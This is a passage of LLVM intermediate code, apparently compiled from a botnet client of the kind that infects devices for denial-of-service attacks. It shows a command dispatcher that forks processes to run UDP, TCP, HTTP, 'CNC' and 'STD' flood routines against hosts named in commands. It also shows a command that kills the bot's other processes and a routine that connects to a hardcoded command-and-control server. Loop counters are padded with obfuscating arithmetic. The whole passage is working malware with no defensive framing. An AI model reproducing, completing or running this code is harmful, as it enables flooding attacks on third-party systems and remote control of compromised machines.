  %176 = call i32 @atoi(i8* %175) #10
  %177 = icmp sgt i32 %176, 32
  br i1 %177, label %187, label %178

; <label>:178:                                    ; preds = %172
  %179 = load i32, i32* %3, align 4
  %180 = icmp eq i32 %179, 7
  br i1 %180, label %181, label %188

; <label>:181:                                    ; preds = %178
  %182 = load i8**, i8*** %4, align 8
  %183 = getelementptr inbounds i8*, i8** %182, i64 6
  %184 = load i8*, i8** %183, align 8
  %185 = call i32 @atoi(i8* %184) #10
  %186 = icmp slt i32 %185, 1
  br i1 %186, label %187, label %188

; <label>:187:                                    ; preds = %181, %172, %166, %160, %154, %148, %142, %139
  br label %636

; <label>:188:                                    ; preds = %181, %178
  %189 = load i8**, i8*** %4, align 8
  %190 = getelementptr inbounds i8*, i8** %189, i64 1
  %191 = load i8*, i8** %190, align 8
  store i8* %191, i8** %8, align 8
  %192 = load i8**, i8*** %4, align 8
  %193 = getelementptr inbounds i8*, i8** %192, i64 2
  %194 = load i8*, i8** %193, align 8
  %195 = call i32 @atoi(i8* %194) #10
  store i32 %195, i32* %9, align 4
  %196 = load i8**, i8*** %4, align 8
  %197 = getelementptr inbounds i8*, i8** %196, i64 3
  %198 = load i8*, i8** %197, align 8
  %199 = call i32 @atoi(i8* %198) #10
  store i32 %199, i32* %10, align 4
  %200 = load i8**, i8*** %4, align 8
  %201 = getelementptr inbounds i8*, i8** %200, i64 4
  %202 = load i8*, i8** %201, align 8
  %203 = call i32 @atoi(i8* %202) #10
  store i32 %203, i32* %11, align 4
  %204 = load i8**, i8*** %4, align 8
  %205 = getelementptr inbounds i8*, i8** %204, i64 5
  %206 = load i8*, i8** %205, align 8
  %207 = call i32 @atoi(i8* %206) #10
  store i32 %207, i32* %12, align 4
  %208 = load i32, i32* %3, align 4
  %209 = icmp eq i32 %208, 7
  br i1 %209, label %210, label %215

; <label>:210:                                    ; preds = %188
  %211 = load i8**, i8*** %4, align 8
  %212 = getelementptr inbounds i8*, i8** %211, i64 6
  %213 = load i8*, i8** %212, align 8
  %214 = call i32 @atoi(i8* %213) #10
  br label %216

; <label>:215:                                    ; preds = %188
  br label %216

; <label>:216:                                    ; preds = %215, %210
  %217 = phi i32 [ %214, %210 ], [ 10, %215 ]
  store i32 %217, i32* %13, align 4
  %218 = load i8*, i8** %8, align 8
  %219 = call i8* @strstr(i8* %218, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #10
  %220 = icmp ne i8* %219, null
  br i1 %220, label %221, label %240

; <label>:221:                                    ; preds = %216
  %222 = load i8*, i8** %8, align 8
  %223 = call i8* @strtok(i8* %222, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %223, i8** %14, align 8
  br label %224

; <label>:224:                                    ; preds = %237, %221
  %225 = load i8*, i8** %14, align 8
  %226 = icmp ne i8* %225, null
  br i1 %226, label %227, label %239

; <label>:227:                                    ; preds = %224
  %228 = call i32 @listFork()
  %229 = icmp ne i32 %228, 0
  br i1 %229, label %237, label %230

; <label>:230:                                    ; preds = %227
  %231 = load i8*, i8** %14, align 8
  %232 = load i32, i32* %9, align 4
  %233 = load i32, i32* %10, align 4
  %234 = load i32, i32* %11, align 4
  %235 = load i32, i32* %12, align 4
  %236 = load i32, i32* %13, align 4
  call void @sendUDP(i8* %231, i32 %232, i32 %233, i32 %234, i32 %235, i32 %236)
  call void @_exit(i32 0) #12
  unreachable

; <label>:237:                                    ; preds = %227
  %238 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %238, i8** %14, align 8
  br label %224

; <label>:239:                                    ; preds = %224
  br label %251

; <label>:240:                                    ; preds = %216
  %241 = call i32 @listFork()
  %242 = icmp ne i32 %241, 0
  br i1 %242, label %243, label %244

; <label>:243:                                    ; preds = %240
  br label %636

; <label>:244:                                    ; preds = %240
  %245 = load i8*, i8** %8, align 8
  %246 = load i32, i32* %9, align 4
  %247 = load i32, i32* %10, align 4
  %248 = load i32, i32* %11, align 4
  %249 = load i32, i32* %12, align 4
  %250 = load i32, i32* %13, align 4
  call void @sendUDP(i8* %245, i32 %246, i32 %247, i32 %248, i32 %249, i32 %250)
  call void @_exit(i32 0) #12
  unreachable

; <label>:251:                                    ; preds = %239
  br label %252

; <label>:252:                                    ; preds = %251, %133
  %253 = load i8**, i8*** %4, align 8
  %254 = getelementptr inbounds i8*, i8** %253, i64 0
  %255 = load i8*, i8** %254, align 8
  %256 = call i32 @strcmp(i8* %255, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.106, i32 0, i32 0)) #10
  %257 = icmp ne i32 %256, 0
  br i1 %257, label %379, label %258

; <label>:258:                                    ; preds = %252
  %259 = load i32, i32* %3, align 4
  %260 = icmp slt i32 %259, 6
  br i1 %260, label %303, label %261

; <label>:261:                                    ; preds = %258
  %262 = load i8**, i8*** %4, align 8
  %263 = getelementptr inbounds i8*, i8** %262, i64 3
  %264 = load i8*, i8** %263, align 8
  %265 = call i32 @atoi(i8* %264) #10
  %266 = icmp eq i32 %265, -1
  br i1 %266, label %303, label %267

; <label>:267:                                    ; preds = %261
  %268 = load i8**, i8*** %4, align 8
  %269 = getelementptr inbounds i8*, i8** %268, i64 2
  %270 = load i8*, i8** %269, align 8
  %271 = call i32 @atoi(i8* %270) #10
  %272 = icmp eq i32 %271, -1
  br i1 %272, label %303, label %273

; <label>:273:                                    ; preds = %267
  %274 = load i8**, i8*** %4, align 8
  %275 = getelementptr inbounds i8*, i8** %274, i64 4
  %276 = load i8*, i8** %275, align 8
  %277 = call i32 @atoi(i8* %276) #10
  %278 = icmp eq i32 %277, -1
  br i1 %278, label %303, label %279

; <label>:279:                                    ; preds = %273
  %280 = load i8**, i8*** %4, align 8
  %281 = getelementptr inbounds i8*, i8** %280, i64 4
  %282 = load i8*, i8** %281, align 8
  %283 = call i32 @atoi(i8* %282) #10
  %284 = icmp sgt i32 %283, 32
  br i1 %284, label %303, label %285

; <label>:285:                                    ; preds = %279
  %286 = load i32, i32* %3, align 4
  %287 = icmp sgt i32 %286, 6
  br i1 %287, label %288, label %294

; <label>:288:                                    ; preds = %285
  %289 = load i8**, i8*** %4, align 8
  %290 = getelementptr inbounds i8*, i8** %289, i64 6
  %291 = load i8*, i8** %290, align 8
  %292 = call i32 @atoi(i8* %291) #10
  %293 = icmp slt i32 %292, 0
  br i1 %293, label %303, label %294

; <label>:294:                                    ; preds = %288, %285
  %295 = load i32, i32* %3, align 4
  %296 = icmp eq i32 %295, 8
  br i1 %296, label %297, label %304

; <label>:297:                                    ; preds = %294
  %298 = load i8**, i8*** %4, align 8
  %299 = getelementptr inbounds i8*, i8** %298, i64 7
  %300 = load i8*, i8** %299, align 8
  %301 = call i32 @atoi(i8* %300) #10
  %302 = icmp slt i32 %301, 1
  br i1 %302, label %303, label %304

; <label>:303:                                    ; preds = %297, %288, %279, %273, %267, %261, %258
  br label %636

; <label>:304:                                    ; preds = %297, %294
  %305 = load i8**, i8*** %4, align 8
  %306 = getelementptr inbounds i8*, i8** %305, i64 1
  %307 = load i8*, i8** %306, align 8
  store i8* %307, i8** %15, align 8
  %308 = load i8**, i8*** %4, align 8
  %309 = getelementptr inbounds i8*, i8** %308, i64 2
  %310 = load i8*, i8** %309, align 8
  %311 = call i32 @atoi(i8* %310) #10
  store i32 %311, i32* %16, align 4
  %312 = load i8**, i8*** %4, align 8
  %313 = getelementptr inbounds i8*, i8** %312, i64 3
  %314 = load i8*, i8** %313, align 8
  %315 = call i32 @atoi(i8* %314) #10
  store i32 %315, i32* %17, align 4
  %316 = load i8**, i8*** %4, align 8
  %317 = getelementptr inbounds i8*, i8** %316, i64 4
  %318 = load i8*, i8** %317, align 8
  %319 = call i32 @atoi(i8* %318) #10
  store i32 %319, i32* %18, align 4
  %320 = load i8**, i8*** %4, align 8
  %321 = getelementptr inbounds i8*, i8** %320, i64 5
  %322 = load i8*, i8** %321, align 8
  store i8* %322, i8** %19, align 8
  %323 = load i32, i32* %3, align 4
  %324 = icmp eq i32 %323, 8
  br i1 %324, label %325, label %330

; <label>:325:                                    ; preds = %304
  %326 = load i8**, i8*** %4, align 8
  %327 = getelementptr inbounds i8*, i8** %326, i64 7
  %328 = load i8*, i8** %327, align 8
  %329 = call i32 @atoi(i8* %328) #10
  br label %331

; <label>:330:                                    ; preds = %304
  br label %331

; <label>:331:                                    ; preds = %330, %325
  %332 = phi i32 [ %329, %325 ], [ 10, %330 ]
  store i32 %332, i32* %20, align 4
  %333 = load i32, i32* %3, align 4
  %334 = icmp sgt i32 %333, 6
  br i1 %334, label %335, label %340

; <label>:335:                                    ; preds = %331
  %336 = load i8**, i8*** %4, align 8
  %337 = getelementptr inbounds i8*, i8** %336, i64 6
  %338 = load i8*, i8** %337, align 8
  %339 = call i32 @atoi(i8* %338) #10
  br label %341

; <label>:340:                                    ; preds = %331
  br label %341

; <label>:341:                                    ; preds = %340, %335
  %342 = phi i32 [ %339, %335 ], [ 0, %340 ]
  store i32 %342, i32* %21, align 4
  %343 = load i8*, i8** %15, align 8
  %344 = call i8* @strstr(i8* %343, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #10
  %345 = icmp ne i8* %344, null
  br i1 %345, label %346, label %366

; <label>:346:                                    ; preds = %341
  %347 = load i8*, i8** %15, align 8
  %348 = call i8* @strtok(i8* %347, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %348, i8** %22, align 8
  br label %349

; <label>:349:                                    ; preds = %363, %346
  %350 = load i8*, i8** %22, align 8
  %351 = icmp ne i8* %350, null
  br i1 %351, label %352, label %365

; <label>:352:                                    ; preds = %349
  %353 = call i32 @listFork()
  %354 = icmp ne i32 %353, 0
  br i1 %354, label %363, label %355

; <label>:355:                                    ; preds = %352
  %356 = load i8*, i8** %22, align 8
  %357 = load i32, i32* %16, align 4
  %358 = load i32, i32* %17, align 4
  %359 = load i32, i32* %18, align 4
  %360 = load i8*, i8** %19, align 8
  %361 = load i32, i32* %21, align 4
  %362 = load i32, i32* %20, align 4
  call void @sendTCP(i8* %356, i32 %357, i32 %358, i32 %359, i8* %360, i32 %361, i32 %362)
  call void @_exit(i32 0) #12
  unreachable

; <label>:363:                                    ; preds = %352
  %364 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %364, i8** %22, align 8
  br label %349

; <label>:365:                                    ; preds = %349
  br label %378

; <label>:366:                                    ; preds = %341
  %367 = call i32 @listFork()
  %368 = icmp ne i32 %367, 0
  br i1 %368, label %369, label %370

; <label>:369:                                    ; preds = %366
  br label %636

; <label>:370:                                    ; preds = %366
  %371 = load i8*, i8** %15, align 8
  %372 = load i32, i32* %16, align 4
  %373 = load i32, i32* %17, align 4
  %374 = load i32, i32* %18, align 4
  %375 = load i8*, i8** %19, align 8
  %376 = load i32, i32* %21, align 4
  %377 = load i32, i32* %20, align 4
  call void @sendTCP(i8* %371, i32 %372, i32 %373, i32 %374, i8* %375, i32 %376, i32 %377)
  call void @_exit(i32 0) #12
  unreachable

; <label>:378:                                    ; preds = %365
  br label %379

; <label>:379:                                    ; preds = %378, %252
  %380 = load i8**, i8*** %4, align 8
  %381 = getelementptr inbounds i8*, i8** %380, i64 0
  %382 = load i8*, i8** %381, align 8
  %383 = call i32 @strcmp(i8* %382, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.107, i32 0, i32 0)) #10
  %384 = icmp ne i32 %383, 0
  br i1 %384, label %454, label %385

; <label>:385:                                    ; preds = %379
  %386 = load i32, i32* %3, align 4
  %387 = icmp slt i32 %386, 3
  br i1 %387, label %394, label %388

; <label>:388:                                    ; preds = %385
  %389 = load i8**, i8*** %4, align 8
  %390 = getelementptr inbounds i8*, i8** %389, i64 2
  %391 = load i8*, i8** %390, align 8
  %392 = call i32 @atoi(i8* %391) #10
  %393 = icmp slt i32 %392, 1
  br i1 %393, label %394, label %395

; <label>:394:                                    ; preds = %388, %385
  br label %636

; <label>:395:                                    ; preds = %388
  %396 = load i8**, i8*** %4, align 8
  %397 = getelementptr inbounds i8*, i8** %396, i64 1
  %398 = load i8*, i8** %397, align 8
  store i8* %398, i8** %23, align 8
  %399 = load i8**, i8*** %4, align 8
  %400 = getelementptr inbounds i8*, i8** %399, i64 2
  %401 = load i8*, i8** %400, align 8
  %402 = call i32 @atoi(i8* %401) #10
  store i32 %402, i32* %24, align 4
  %403 = load i8*, i8** %23, align 8
  %404 = call i8* @strstr(i8* %403, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #10
  %405 = icmp ne i8* %404, null
  br i1 %405, label %406, label %433

; <label>:406:                                    ; preds = %395
  %407 = load i8*, i8** %23, align 8
  %408 = call i8* @strtok(i8* %407, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %408, i8** %25, align 8
  br label %409

; <label>:409:                                    ; preds = %430, %406
  %410 = load i8*, i8** %25, align 8
  %411 = icmp ne i8* %410, null
  br i1 %411, label %412, label %432

; <label>:412:                                    ; preds = %409
  %413 = call i32 @listFork()
  %414 = icmp ne i32 %413, 0
  br i1 %414, label %430, label %415

; <label>:415:                                    ; preds = %412
  store i32 0, i32* %26, align 4
  br label %416

; <label>:416:                                    ; preds = %419, %415
  %417 = load i32, i32* %26, align 4
  %418 = icmp slt i32 %417, 10
  br i1 %418, label %419, label %427

; <label>:419:                                    ; preds = %416
  %420 = load i8*, i8** %23, align 8
  %421 = load i32, i32* %24, align 4
  call void @sendHTTP(i8* %420, i32 %421)
  %422 = load i32, i32* %26, align 4
  %423 = sub i32 %422, -489505733
  %424 = add i32 %423, 1
  %425 = add i32 %424, -489505733
  %426 = add nsw i32 %422, 1
  store i32 %425, i32* %26, align 4
  br label %416

; <label>:427:                                    ; preds = %416
  %428 = load i32, i32* @mainCommSock, align 4
  %429 = call i32 @close(i32 %428)
  call void @_exit(i32 0) #12
  unreachable

; <label>:430:                                    ; preds = %412
  %431 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %431, i8** %25, align 8
  br label %409

; <label>:432:                                    ; preds = %409
  br label %453

; <label>:433:                                    ; preds = %395
  %434 = call i32 @listFork()
  %435 = icmp ne i32 %434, 0
  br i1 %435, label %436, label %437

; <label>:436:                                    ; preds = %433
  br label %636

; <label>:437:                                    ; preds = %433
  store i32 0, i32* %27, align 4
  br label %438

; <label>:438:                                    ; preds = %441, %437
  %439 = load i32, i32* %27, align 4
  %440 = icmp slt i32 %439, 10
  br i1 %440, label %441, label %450

; <label>:441:                                    ; preds = %438
  %442 = load i8*, i8** %23, align 8
  %443 = load i32, i32* %24, align 4
  call void @sendHTTP(i8* %442, i32 %443)
  %444 = load i32, i32* %27, align 4
  %445 = sub i32 0, %444
  %446 = sub i32 0, 1
  %447 = add i32 %445, %446
  %448 = sub i32 0, %447
  %449 = add nsw i32 %444, 1
  store i32 %448, i32* %27, align 4
  br label %438

; <label>:450:                                    ; preds = %438
  %451 = load i32, i32* @mainCommSock, align 4
  %452 = call i32 @close(i32 %451)
  call void @_exit(i32 0) #12
  unreachable

; <label>:453:                                    ; preds = %432
  br label %454

; <label>:454:                                    ; preds = %453, %379
  %455 = load i8**, i8*** %4, align 8
  %456 = getelementptr inbounds i8*, i8** %455, i64 0
  %457 = load i8*, i8** %456, align 8
  %458 = call i32 @strcmp(i8* %457, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i32 0, i32 0)) #10
  %459 = icmp ne i32 %458, 0
  br i1 %459, label %518, label %460

; <label>:460:                                    ; preds = %454
  %461 = load i32, i32* %3, align 4
  %462 = icmp slt i32 %461, 4
  br i1 %462, label %475, label %463

; <label>:463:                                    ; preds = %460
  %464 = load i8**, i8*** %4, align 8
  %465 = getelementptr inbounds i8*, i8** %464, i64 2
  %466 = load i8*, i8** %465, align 8
  %467 = call i32 @atoi(i8* %466) #10
  %468 = icmp slt i32 %467, 1
  br i1 %468, label %475, label %469

; <label>:469:                                    ; preds = %463
  %470 = load i8**, i8*** %4, align 8
  %471 = getelementptr inbounds i8*, i8** %470, i64 3
  %472 = load i8*, i8** %471, align 8
  %473 = call i32 @atoi(i8* %472) #10
  %474 = icmp slt i32 %473, 1
  br i1 %474, label %475, label %476

; <label>:475:                                    ; preds = %469, %463, %460
  br label %636

; <label>:476:                                    ; preds = %469
  %477 = load i8**, i8*** %4, align 8
  %478 = getelementptr inbounds i8*, i8** %477, i64 1
  %479 = load i8*, i8** %478, align 8
  store i8* %479, i8** %28, align 8
  %480 = load i8**, i8*** %4, align 8
  %481 = getelementptr inbounds i8*, i8** %480, i64 2
  %482 = load i8*, i8** %481, align 8
  %483 = call i32 @atoi(i8* %482) #10
  store i32 %483, i32* %29, align 4
  %484 = load i8**, i8*** %4, align 8
  %485 = getelementptr inbounds i8*, i8** %484, i64 3
  %486 = load i8*, i8** %485, align 8
  %487 = call i32 @atoi(i8* %486) #10
  store i32 %487, i32* %30, align 4
  %488 = load i8*, i8** %28, align 8
  %489 = call i8* @strstr(i8* %488, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #10
  %490 = icmp ne i8* %489, null
  br i1 %490, label %491, label %509

; <label>:491:                                    ; preds = %476
  %492 = load i8*, i8** %28, align 8
  %493 = call i8* @strtok(i8* %492, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %493, i8** %31, align 8
  br label %494

; <label>:494:                                    ; preds = %506, %491
  %495 = load i8*, i8** %31, align 8
  %496 = icmp ne i8* %495, null
  br i1 %496, label %497, label %508

; <label>:497:                                    ; preds = %494
  %498 = call i32 @listFork()
  %499 = icmp ne i32 %498, 0
  br i1 %499, label %506, label %500

; <label>:500:                                    ; preds = %497
  %501 = load i8*, i8** %31, align 8
  %502 = load i32, i32* %29, align 4
  %503 = load i32, i32* %30, align 4
  call void @sendCNC(i8* %501, i32 %502, i32 %503)
  %504 = load i32, i32* @mainCommSock, align 4
  %505 = call i32 @close(i32 %504)
  call void @_exit(i32 0) #12
  unreachable

; <label>:506:                                    ; preds = %497
  %507 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %507, i8** %31, align 8
  br label %494

; <label>:508:                                    ; preds = %494
  br label %517

; <label>:509:                                    ; preds = %476
  %510 = call i32 @listFork()
  %511 = icmp ne i32 %510, 0
  br i1 %511, label %512, label %513

; <label>:512:                                    ; preds = %509
  br label %636

; <label>:513:                                    ; preds = %509
  %514 = load i8*, i8** %28, align 8
  %515 = load i32, i32* %29, align 4
  %516 = load i32, i32* %30, align 4
  call void @sendCNC(i8* %514, i32 %515, i32 %516)
  call void @_exit(i32 0) #12
  unreachable

; <label>:517:                                    ; preds = %508
  br label %518

; <label>:518:                                    ; preds = %517, %454
  %519 = load i8**, i8*** %4, align 8
  %520 = getelementptr inbounds i8*, i8** %519, i64 0
  %521 = load i8*, i8** %520, align 8
  %522 = call i32 @strcmp(i8* %521, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.109, i32 0, i32 0)) #10
  %523 = icmp ne i32 %522, 0
  br i1 %523, label %580, label %524

; <label>:524:                                    ; preds = %518
  %525 = load i32, i32* %3, align 4
  %526 = icmp slt i32 %525, 4
  br i1 %526, label %539, label %527

; <label>:527:                                    ; preds = %524
  %528 = load i8**, i8*** %4, align 8
  %529 = getelementptr inbounds i8*, i8** %528, i64 2
  %530 = load i8*, i8** %529, align 8
  %531 = call i32 @atoi(i8* %530) #10
  %532 = icmp slt i32 %531, 1
  br i1 %532, label %539, label %533

; <label>:533:                                    ; preds = %527
  %534 = load i8**, i8*** %4, align 8
  %535 = getelementptr inbounds i8*, i8** %534, i64 3
  %536 = load i8*, i8** %535, align 8
  %537 = call i32 @atoi(i8* %536) #10
  %538 = icmp slt i32 %537, 1
  br i1 %538, label %539, label %540

; <label>:539:                                    ; preds = %533, %527, %524
  br label %636

; <label>:540:                                    ; preds = %533
  %541 = load i8**, i8*** %4, align 8
  %542 = getelementptr inbounds i8*, i8** %541, i64 1
  %543 = load i8*, i8** %542, align 8
  store i8* %543, i8** %32, align 8
  %544 = load i8**, i8*** %4, align 8
  %545 = getelementptr inbounds i8*, i8** %544, i64 2
  %546 = load i8*, i8** %545, align 8
  %547 = call i32 @atoi(i8* %546) #10
  store i32 %547, i32* %33, align 4
  %548 = load i8**, i8*** %4, align 8
  %549 = getelementptr inbounds i8*, i8** %548, i64 3
  %550 = load i8*, i8** %549, align 8
  %551 = call i32 @atoi(i8* %550) #10
  store i32 %551, i32* %34, align 4
  %552 = load i8*, i8** %32, align 8
  %553 = call i8* @strstr(i8* %552, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #10
  %554 = icmp ne i8* %553, null
  br i1 %554, label %555, label %571

; <label>:555:                                    ; preds = %540
  %556 = load i8*, i8** %32, align 8
  %557 = call i8* @strtok(i8* %556, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %557, i8** %35, align 8
  br label %558

; <label>:558:                                    ; preds = %568, %555
  %559 = load i8*, i8** %35, align 8
  %560 = icmp ne i8* %559, null
  br i1 %560, label %561, label %570

; <label>:561:                                    ; preds = %558
  %562 = call i32 @listFork()
  %563 = icmp ne i32 %562, 0
  br i1 %563, label %568, label %564

; <label>:564:                                    ; preds = %561
  %565 = load i8*, i8** %35, align 8
  %566 = load i32, i32* %33, align 4
  %567 = load i32, i32* %34, align 4
  call void @sendSTD(i8* %565, i32 %566, i32 %567)
  call void @_exit(i32 0) #12
  unreachable

; <label>:568:                                    ; preds = %561
  %569 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %569, i8** %35, align 8
  br label %558

; <label>:570:                                    ; preds = %558
  br label %579

; <label>:571:                                    ; preds = %540
  %572 = call i32 @listFork()
  %573 = icmp ne i32 %572, 0
  br i1 %573, label %574, label %575

; <label>:574:                                    ; preds = %571
  br label %636

; <label>:575:                                    ; preds = %571
  %576 = load i8*, i8** %32, align 8
  %577 = load i32, i32* %33, align 4
  %578 = load i32, i32* %34, align 4
  call void @sendSTD(i8* %576, i32 %577, i32 %578)
  call void @_exit(i32 0) #12
  unreachable

; <label>:579:                                    ; preds = %570
  br label %580

; <label>:580:                                    ; preds = %579, %518
  %581 = load i8**, i8*** %4, align 8
  %582 = getelementptr inbounds i8*, i8** %581, i64 0
  %583 = load i8*, i8** %582, align 8
  %584 = call i32 @strcmp(i8* %583, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.110, i32 0, i32 0)) #10
  %585 = icmp ne i32 %584, 0
  br i1 %585, label %629, label %586

; <label>:586:                                    ; preds = %580
  store i32 0, i32* %36, align 4
  store i64 0, i64* %37, align 8
  br label %587

; <label>:587:                                    ; preds = %616, %586
  %588 = load i64, i64* %37, align 8
  %589 = load i64, i64* @numpids, align 8
  %590 = icmp ult i64 %588, %589
  br i1 %590, label %591, label %623

; <label>:591:                                    ; preds = %587
  %592 = load i32*, i32** @pids, align 8
  %593 = load i64, i64* %37, align 8
  %594 = getelementptr inbounds i32, i32* %592, i64 %593
  %595 = load i32, i32* %594, align 4
  %596 = icmp ne i32 %595, 0
  br i1 %596, label %597, label %615

; <label>:597:                                    ; preds = %591
  %598 = load i32*, i32** @pids, align 8
  %599 = load i64, i64* %37, align 8
  %600 = getelementptr inbounds i32, i32* %598, i64 %599
  %601 = load i32, i32* %600, align 4
  %602 = call i32 @getpid() #2
  %603 = icmp ne i32 %601, %602
  br i1 %603, label %604, label %615

; <label>:604:                                    ; preds = %597
  %605 = load i32*, i32** @pids, align 8
  %606 = load i64, i64* %37, align 8
  %607 = getelementptr inbounds i32, i32* %605, i64 %606
  %608 = load i32, i32* %607, align 4
  %609 = call i32 @kill(i32 %608, i32 9) #2
  %610 = load i32, i32* %36, align 4
  %611 = sub i32 %610, -58384649
  %612 = add i32 %611, 1
  %613 = add i32 %612, -58384649
  %614 = add nsw i32 %610, 1
  store i32 %613, i32* %36, align 4
  br label %615

; <label>:615:                                    ; preds = %604, %597, %591
  br label %616

; <label>:616:                                    ; preds = %615
  %617 = load i64, i64* %37, align 8
  %618 = sub i64 0, %617
  %619 = sub i64 0, 1
  %620 = add i64 %618, %619
  %621 = sub i64 0, %620
  %622 = add i64 %617, 1
  store i64 %621, i64* %37, align 8
  br label %587

; <label>:623:                                    ; preds = %587
  %624 = load i32, i32* %36, align 4
  %625 = icmp sgt i32 %624, 0
  br i1 %625, label %626, label %627

; <label>:626:                                    ; preds = %623
  br label %628

; <label>:627:                                    ; preds = %623
  br label %628

; <label>:628:                                    ; preds = %627, %626
  br label %629

; <label>:629:                                    ; preds = %628, %580
  %630 = load i8**, i8*** %4, align 8
  %631 = getelementptr inbounds i8*, i8** %630, i64 0
  %632 = load i8*, i8** %631, align 8
  %633 = call i32 @strcmp(i8* %632, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.111, i32 0, i32 0)) #10
  %634 = icmp ne i32 %633, 0
  br i1 %634, label %636, label %635

; <label>:635:                                    ; preds = %629
  call void @exit(i32 0) #14
  unreachable

; <label>:636:                                    ; preds = %629, %574, %539, %512, %475, %436, %394, %369, %303, %243, %187, %128, %123, %116, %104, %99, %92, %78, %66, %52, %43
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = sub i32 0, %11
  %13 = sub i32 0, 1
  %14 = add i32 %12, %13
  %15 = sub i32 0, %14
  %16 = add nsw i32 %11, 1
  %17 = sext i32 %15 to i64
  %18 = icmp eq i64 %17, 1
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %26

; <label>:20:                                     ; preds = %10
  %21 = load i32, i32* @currentServer, align 4
  %22 = sub i32 %21, -561851680
  %23 = add i32 %22, 1
  %24 = add i32 %23, -561851680
  %25 = add nsw i32 %21, 1
  store i32 %24, i32* @currentServer, align 4
  br label %26

; <label>:26:                                     ; preds = %20, %19
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %28 = load i32, i32* @currentServer, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = call i8* @strcpy(i8* %27, i8* %31) #2
  store i32 443, i32* %3, align 4
  %33 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %34 = call i8* @strchr(i8* %33, i32 58) #10
  %35 = icmp ne i8* %34, null
  br i1 %35, label %36, label %43

; <label>:36:                                     ; preds = %26
  %37 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %38 = call i8* @strchr(i8* %37, i32 58) #10
  %39 = getelementptr inbounds i8, i8* %38, i64 1
  %40 = call i32 @atoi(i8* %39) #10
  store i32 %40, i32* %3, align 4
  %41 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %42 = call i8* @strchr(i8* %41, i32 58) #10
  store i8 0, i8* %42, align 1
  br label %43

; <label>:43:                                     ; preds = %36, %26
  %44 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %44, i32* @mainCommSock, align 4
  %45 = load i32, i32* @mainCommSock, align 4
  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %47 = load i32, i32* %3, align 4
  %48 = call i32 @connectTimeout(i32 %45, i8* %46, i32 %47, i32 30)
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %51, label %50

; <label>:50:                                     ; preds = %43
  store i32 1, i32* %1, align 4
  br label %52

; <label>:51:                                     ; preds = %43
  store i32 0, i32* %1, align 4
  br label %52

; <label>:52:                                     ; preds = %51, %50
  %53 = load i32, i32* %1, align 4
  ret i32 %53
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
